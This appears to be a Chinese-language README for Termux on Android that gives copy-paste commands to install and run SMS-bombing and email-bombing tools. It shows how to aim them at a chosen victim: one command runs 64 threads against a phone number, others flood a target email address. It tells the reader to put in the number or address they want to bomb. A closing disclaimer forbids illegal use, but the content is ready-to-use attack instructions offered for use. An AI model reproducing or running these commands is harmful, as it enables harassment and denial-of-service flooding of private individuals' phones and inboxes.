# 概述
  
- 如果你还没有下载termux可以点击[这里](https://f-droid.org/en/packages/com.termux/)
- 若你没有科学环境可以自行搜索下载，或者点击[这里](https://m.youxibao.com/app/15333.html)
  
- 假如你在代码使用的过程中出现
>Do you want to continue? [Y/n]
>
- 直接回车enter即可
  
# 一键代码使用
   ## 短信轰炸
  
  `pkg install git && pkg install python && pkg install openssl &&  git clone https://github.com/AdminWhaleFall/SMSBoom.git/ && cd SMSBoom && pip install -r requirements.txt && python smsboom.py`
- 直接粘贴代码进入即可，后续可以直接使用下列指令
- 
  `cd SMSBoom;python smsboom.py run -t 64 -p 184****9269 -f 60 `
  将手机号替换为你需要轰炸的手机号

  ## 邮箱轰炸
  
  在使用之前配置
  
 `pkg install git && pkg install php && pkg install python && git clone https://github.com/cat-bucket/mail-bomber && cd mail-bomber `
 

### 无需邮箱但无法指定内容
   
更新接口（可选）

`php index.php update-nodes`

后续使用

`cd mail-bomber;php index.php start-bombing 邮箱`

替换要轰炸的邮箱


### 邮箱轰炸 (需邮箱但可以指定内容)

   `cd mail-bomber;python cat.py`
   
   按照提示输入即可


# 免责声明
本库为对各种程序的简单调用提供，仅供参考，禁止用于商业及非法用途。使用一键指令造成的事故与损失，与作者无关


